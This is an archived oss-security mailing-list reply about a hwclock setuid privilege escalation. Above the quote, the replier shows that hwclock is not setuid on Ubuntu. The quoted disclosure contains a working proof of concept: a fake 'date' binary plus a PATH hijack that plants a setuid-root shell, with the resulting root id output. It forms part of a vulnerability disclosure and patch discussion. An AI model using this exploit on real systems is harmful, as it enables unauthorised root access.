X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4650" "Tuesday" "26" "May" "2015" "09:19:13" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<728CB05F-659E-429E-A59D-577F4251DFDA@me.com>" "148" "Re: [oss-security] hwclock(8) SUID privilege escalation" nil nil nil "5" "2015052613:19:13" "[oss-security] hwclock(8) SUID privilege escalation" (number mark "        larry0@me.co May 26  148/4650  " thread-indent "\"Re: [oss-security] hwclock(8) SUID privilege escalation\"\n") "<20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>" ("<20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 15445 invoked by uid 550); 26 May 2015 13:19:31 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 15421 invoked from network); 26 May 2015 13:19:30 -0000
X-Proofpoint-Virus-Version: vendor=fsecure
 engine=2.50.10432:5.14.151,1.0.33,0.0.0000
 definitions=2015-05-26_02:2015-05-26,2015-05-26,1970-01-01 signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 suspectscore=0 phishscore=0 adultscore=0 bulkscore=0 classifier=spam adjust=0
 reason=mlx scancount=1 engine=7.0.1-1412110000 definitions=main-1505260173
Content-type: text/plain; charset=windows-1252
MIME-version: 1.0 (Mac OS X Mail 8.2 \(2098\))
In-reply-to: <20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>
Content-transfer-encoding: quoted-printable
Message-id: <728CB05F-659E-429E-A59D-577F4251DFDA@me.com>
References: <20150526124747.16414nohrczpwps0@webmail.alunos.dcc.fc.up.pt>
X-Mailer: Apple Mail (2.2098)
Date: Tue, 26 May 2015 09:19:13 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] hwclock(8) SUID privilege escalation
To: Open Source Security <oss-security@lists.openwall.com>

It=92s not setuid root on my Ubuntu system.

larry@meep:~$ which hwclock
/sbin/hwclock
larry@meep:~$ ls -l /sbin/hwclock=20
-rwxr-xr-x 1 root root 46764 Feb 12 13:54 /sbin/hwclock
larry@meep:~$ uname -a
Linux meep 3.13.0-48-generic #80-Ubuntu SMP Thu Mar 12 11:16:18 UTC 2015 i6=
86 i686 i686 GNU/Linux
larry@meep:~$ cat /etc/issue
Ubuntu 14.04.2 LTS \n \l




> On May 26, 2015, at 6:47 AM, up201407890@alunos.dcc.fc.up.pt wrote:
>=20
> Hello,
>=20
> During a recent assessment I have stumbled across a system which had
> hwclock(8) setuid root
>=20
> hwclock is a part of util-linux, all versions affected
>=20
> $ man hwclock | sed -n '223,231p'
>=20
> Users access and setuid
>       Sometimes, you need to install hwclock setuid root. If you
> want users other than the superuser to be able to display the clock
> value using the direct ISA I/O
>       method,  install  it setuid root. If you have the /dev/rtc
> interface on your system or are on a non-ISA system, there's probably
> no need for users to use the
>       direct ISA I/O method, so don't bother.
>=20
>       In any case, hwclock will not allow you to set anything unless
> you have the superuser real uid.  (This  is  restriction  is  not
> necessary  if  you  haven't
>       installed setuid root, but it's there for now).
>=20
> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L2=
041
>=20
> "The program is designed to run setuid superuser, since we need to be able
> to do direct I/O. (More to the point: we need permission to execute the
> iopl() system call). (However, if you use one of the methods other than
> direct ISA I/O to access the clock, no setuid is required)."
>=20
> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L1=
920
>=20
> "program is designed to run setuid (in some situations)"
>=20
>=20
> Some comments in code and unfortunately also man page
> advertising that setuid is no problem. That's pretty stupid promise.
>=20
>=20
> from util-linux/2.26.2-5/sys-utils/hwclock.c
> http://sources.debian.net/src/util-linux/2.26.2-5/sys-utils/hwclock.c/#L7=
48
>=20
>=20
> /* Quotes in date_opt would ruin the date command we construct. */
>        if (strchr(date_opt, '"') !=3D NULL) {
>                warnx(_
>                      ("The value of the --date option is not a valid date=
.\n"
>                       "In particular, it contains quotation marks."));
>                return 12;
>        }
>=20
>        sprintf(date_command, "date --date=3D\"%s\" +seconds-into-epoch=3D=
%%s",
>                date_opt);
> 				[...]
>=20
> 	date_child_fp =3D popen(date_command, "r");
>=20
> 				[...]
>=20
> hwclock uses popen() to date_command which is 'date --date=3D\"%s\"
> +seconds-into-epoch=3D%%s'
>=20
> Exploiting is trivial, since $PATH is user-controlled
>=20
>=20
>=20
> $ ls -l /usr/sbin/hwclock
> -rwsr-sr-x. 1 root root 48096 Nov 27 14:10 /usr/sbin/hwclock
> $ cat > date.c;gcc date.c -o date
> main()
> {
> chown("/tmp/sploit", 0, 0);
> chmod("/tmp/sploit", 04755);
> }
> ^D
> $ cp /bin/sh /tmp/sploit
> $ PATH=3D".:$PATH" /usr/sbin/hwclock --set --date=3D"05/23/2015 20:35:37"
> hwclock: The date command issued by hwclock returned unexpected results.
> The command was:
>  date --date=3D"05/23/2015 20:35:37" +seconds-into-epoch=3D%s
> The response was:
>=20
> hwclock: No usable set-to time.  Cannot set clock.
> $ /tmp/sploit
> # id
> euid=3D0(root) groups=3D0(root)
>=20
>=20
> Can a CVE be assigned?
>=20
>=20
> Notes:
>=20
> Please note that this is possible on Debian-derived (and therefore Ubuntu=
),
> because /bin/sh is provided by dash which does NOT make use
> of privmode (does not drop privileges if ruid !=3D euid, unlike bash),
> which is a very stupid idea.
>=20
> privmode is surprisingly effective at mitigating some common vulnerability
> classes and misconfigurations, and it has been around since mid 90's.
> Indeed, Chet Ramey (bash author and maintainer) explains that the
> purpose of this is to prevent "bogus system(3)/popen(3) calls in
> setuid executables"
>=20
>=20
> TL;DR: When setuid root, hwclock relies on $PATH to popen() the date
> command, meaning privilege escalation can occur since $PATH is
> user-controlled.
>=20
>=20
> Patches are available, signed off by Karel Zak <kzak@redhat.com>
> https://github.com/karelzak/util-linux/commit/687cc5d58942b24a9f4013c6887=
6d8cbea907ab1
>=20
> Initial bug report:
> https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=3D786804
>=20
>=20
> Thanks,
> Federico Bento.
>=20
> ----------------------------------------------------------------
> This message was sent using IMP, the Internet Messaging Program.
>=20

